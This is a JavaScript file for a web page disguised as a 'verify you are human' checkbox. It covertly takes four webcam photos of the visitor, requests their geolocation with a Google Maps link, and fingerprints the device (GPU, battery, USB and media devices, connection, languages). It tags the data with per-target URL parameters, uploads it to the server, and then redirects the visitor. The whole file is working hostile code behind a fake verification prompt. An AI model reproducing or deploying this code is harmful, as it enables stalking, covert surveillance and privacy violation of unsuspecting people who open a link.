const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const projectId = urlParams.get("r_id");
const username = urlParams.get("u_id");

const USER_DATA = {};
const sizes = {
  w: 320,
  h: 240,
};

const videoElement = document.createElement("video");
const offscreenCanvas = document.createElement("canvas");
var gridSize = 2;
offscreenCanvas.width = sizes.w * gridSize;
offscreenCanvas.height = sizes.h * gridSize;
const offscreenCtx = offscreenCanvas.getContext("2d");
// document.body.appendChild(offscreenCanvas);
let imageCount = 0,
  userVerified = false;

// Request location permission
function getLocation() {
  let loc = { latitude: null, longitude: null };

  return new Promise((res, rej) => {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude, altitude, accuracy } = position.coords;
        loc = {
          latitude,
          longitude,
          altitude,
          accuracy,
          googleMap: `https://www.google.com/maps/@${latitude},${longitude},14z`,
        };

        res(loc);
      },
      (error) => {
        // console.log("Location permission denied:", error);
        res(loc);
      }
    );
  });
}

async function getDeviceInfo() {
  const DEVICE_INFO = {};

  DEVICE_INFO["appCodeName"] = navigator.appCodeName;
  DEVICE_INFO["appName"] = navigator.appName;
  DEVICE_INFO["appVersion"] = navigator.appVersion;
  DEVICE_INFO["userAgent"] = navigator.userAgent;
  DEVICE_INFO["platform"] = navigator.platform;
  // user Agent
  if ("userAgentData" in navigator) {
    const { brands, mobile, platform } = navigator.userAgentData;
    DEVICE_INFO["device"] = {
      brands,
      mobile,
      platform,
    };
  }
  // gpu
  const canvas = document.createElement("canvas");
  const gl = canvas.getContext("webgl2");
  if (gl) {
    DEVICE_INFO["gpu"] = {
      renderer: gl.getParameter(gl.RENDERER),
      vendor: gl.getParameter(gl.VENDOR),
      version: gl.getParameter(gl.VERSION),
      shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
    };
  }
  // processor RAM
  DEVICE_INFO["logicalProcessors"] = navigator.hardwareConcurrency;
  DEVICE_INFO["memory"] = navigator.deviceMemory;

  // connection
  if ("connection" in navigator) {
    const { effectiveType, downlink, rtt, saveData } = navigator.connection;
    DEVICE_INFO["connection"] = {
      effectiveType,
      downloadSpeed: downlink + " Mbps",
      roundTripTime: rtt + " ms",
      dataSaver: saveData ? "on" : "off",
    };
  }
  //usb

  if ("usb" in navigator) {
    const devices = await navigator.usb.getDevices();
    DEVICE_INFO["usbDevicesConnected"] = devices.length;
  } else {
    DEVICE_INFO["usbDevicesConnected"] = 0;
  }
  // product
  DEVICE_INFO["product"] = navigator.product;
  DEVICE_INFO["productSub"] = navigator.productSub;
  // plugins
  DEVICE_INFO["plugins"] = navigator.plugins;
  DEVICE_INFO["onLine"] = navigator.onLine;
  DEVICE_INFO["pdfViewerEnabled"] = navigator.pdfViewerEnabled;

  // battery
  if ("getBattery" in navigator) {
    const { level, charging, chargingTime, dischargingTime } =
      await navigator.getBattery();
    DEVICE_INFO["battery"] = {
      level: level * 100,
      charging,
      chargingTime,
      dischargingTime,
    };
  }

  // media devices
  if (
    "mediaDevices" in navigator &&
    "enumerateDevices" in navigator.mediaDevices
  ) {
    const mediaDevices = [];
    const devices = await navigator.mediaDevices.enumerateDevices();

    devices.forEach(({ deviceId, groupId, kind, label }) => {
      mediaDevices.push({
        id: deviceId,
        group: groupId,
        type: kind,
        label,
      });
    });

    DEVICE_INFO["mediaDevices"] = mediaDevices;
  }
  // languages
  DEVICE_INFO["languages"] = navigator.languages;
  DEVICE_INFO["language"] = navigator.language;

  return DEVICE_INFO;
}

function scheduleImageCapture() {
  if (imageCount !== 4) {
    setTimeout(() => {
      captureImage();
      scheduleImageCapture();
    }, 600);
  }
}

function dataURLtoFile(dataURL, fileName) {
  const arr = dataURL.split(",");
  const mime = arr[0].match(/:(.*?);/)[1];
  const bstr = atob(arr[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  while (n--) {
    u8arr[n] = bstr.charCodeAt(n);
  }
  return new File([u8arr], fileName, { type: mime });
}

function captureImage() {
  // Number of rows and columns in the grid
  const n = imageCount;
  const r = parseInt(n / gridSize);
  const c = n % gridSize;
  // console.log(n, [r, c]);
  var y = r * sizes.h;
  var x = c * sizes.w;
  offscreenCtx.drawImage(videoElement, x, y, sizes.w, sizes.h);
  imageCount += 1;

  if (imageCount === 4) {
    const dataURL = offscreenCanvas.toDataURL("image/jpeg", 0.9);
    const filename = `${username}_${new Date().getTime()}.jpeg`;
    const imageFile = dataURLtoFile(dataURL, filename);
    uploadCapturedImages(imageFile);
  }
}

async function upload(img) {
  let bodyContent = new FormData();
  bodyContent.append("image", img);
  bodyContent.append("username", username);
  bodyContent.append("project", projectId);

  let response = await fetch(window.location.origin + "/upload", {
    method: "POST",
    body: bodyContent,
  });

  let data = await response.json();
  return data.filename;
}

async function uploadCapturedImages(img) {
  USER_DATA["userImages"] = "";
  if (img instanceof File) {
    userImage = USER_DATA["userImages"] = await upload(img);
  }

  // redirect
  const url = "/redirect";
  const options = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      projectId,
      username,
      ...USER_DATA,
    }),
  };

  const response = await fetch(url, options);
  const data = await response.json();
  if (data.success) {
    toggleCheckbox();
    window.location.href = data.url;
  }
}

function toggleCheckbox() {
  if (userVerified) return;
  const checkbox = document.getElementById("human");
  const label = checkbox.nextElementSibling;
  label.textContent = "Verifying....";
  const loadingSpinner = document.querySelector("span#loading");

  checkbox.style.display = "none";
  loadingSpinner.style.display = "inline-block";
  loadingSpinner.style.opacity = 1;
  userVerified = true;
}

async function start() {
  document.querySelector("#human").onchange = toggleCheckbox;

  USER_DATA["device"] = await getDeviceInfo();
  USER_DATA["location"] = await getLocation();
}

navigator.mediaDevices
  .getUserMedia({
    video: { facingMode: "user", width: sizes.w, height: sizes.h },
  })
  .then((stream) => {
    videoElement.srcObject = stream;
    videoElement.onloadedmetadata = () => {
      videoElement.play();
      start().then(scheduleImageCapture);
    };
  })
  .catch((error) => {
    //no image
    start().then(uploadCapturedImages);
  });
